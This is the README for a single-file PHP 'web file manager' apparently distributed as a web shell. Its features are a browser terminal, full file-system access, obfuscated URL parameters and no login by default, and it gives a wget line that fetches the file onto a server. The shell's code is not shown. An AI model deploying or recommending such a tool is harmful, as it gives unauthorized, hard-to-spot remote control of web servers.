<div align="center">

<pre>
 ██████╗ ███╗   ██╗███████╗███╗   ██╗██████╗
 ██╔══██╗████╗  ██║██╔════╝████╗  ██║██╔══██╗
 ██║  ██║██╔██╗ ██║█████╗  ██╔██╗ ██║██║  ██║
 ██║  ██║██║╚██╗██║██╔══╝  ██║╚██╗██║██║  ██║
 ██████╔╝██║ ╚████║███████╗██║ ╚████║██████╔╝
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═══╝╚═════╝
</pre>

**PHP Web File Manager — Single File, Zero Dependencies**

![PHP](https://img.shields.io/badge/PHP-5.5%2B-777BB4?style=flat-square&logo=php&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-4ec9b0?style=flat-square)
![Size](https://img.shields.io/badge/Size-Single%20File-569cd6?style=flat-square)
![Theme](https://img.shields.io/badge/Theme-VS%20Code%20Dark-1e1e1e?style=flat-square)

</div>

---

## Overview

DNEND is a lightweight, single-file PHP web file manager built for web developers who need fast server-side file access directly from the browser — no installation, no setup, just upload and go.

---

## Features

| Category | Feature |
|---|---|
| **Files** | Browse, Upload, Download, Rename, Delete, Zip, Unzip |
| **Editor** | Monaco Editor (VS Code engine), Syntax Highlight, Error Markers, Ctrl+S |
| **Terminal** | Browser-based shell, command history, Arrow Up/Down |
| **Security** | Encrypted URL params (XOR + Base64), BCrypt password support |
| **UI** | VS Code dark theme, mobile-friendly, horizontal scroll |

---

## Quick Start

```bash
# 1. Upload to your server
wget https://raw.githubusercontent.com/dokter69/DNEND-SHELL/refs/heads/main/dnendpass.php

# 2. Open in browser
https://yourdomain.com/dnendpass.php
```

---

## Files

```
dnend.php          → Main file manager (no login)
dnendpass.php    → Password Login Opsional
```

---

## Password Protection

Open `dnendpass.php` and edit the top section:

**Enable login** — change line 3:
```php
define('DNEND_NOAUTH', false);
```

**Set password** — add above it:
```php
// Plain text
define('DNEND_PASS', 'yourpassword');

// or BCrypt hash (recommended)
define('DNEND_PASS', '$2y$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');
```

> Generate BCrypt hash:
> ```php
> <?php echo password_hash('yourpassword', PASSWORD_BCRYPT); ?>
> ```

---

## Compatibility

```
PHP     5.5 / 5.6 / 7.x / 8.x
Server  Apache · Nginx · LiteSpeed · XAMPP · WAMP
OS      Linux · Windows
Browser Chrome · Firefox · Edge · Safari
```

---

## Security Notes

> ⚠️ **Important** — This tool gives full file system access. Use responsibly.

- URL parameters are encrypted so folder paths are not exposed
- Use BCrypt hash for stronger password protection
- Restrict access by IP in `.htaccess` if possible
- Remove or rename the file when not in use

---

## License

MIT — free to use, modify, and distribute.  
Credit appreciated: **SERIKAT DND 993**

---

<div align="center">

**DNEND v 1.0** &nbsp;·&nbsp; by **SERIKAT DND 993** &nbsp;·&nbsp; Dev: Natan Utama © 2026

</div>
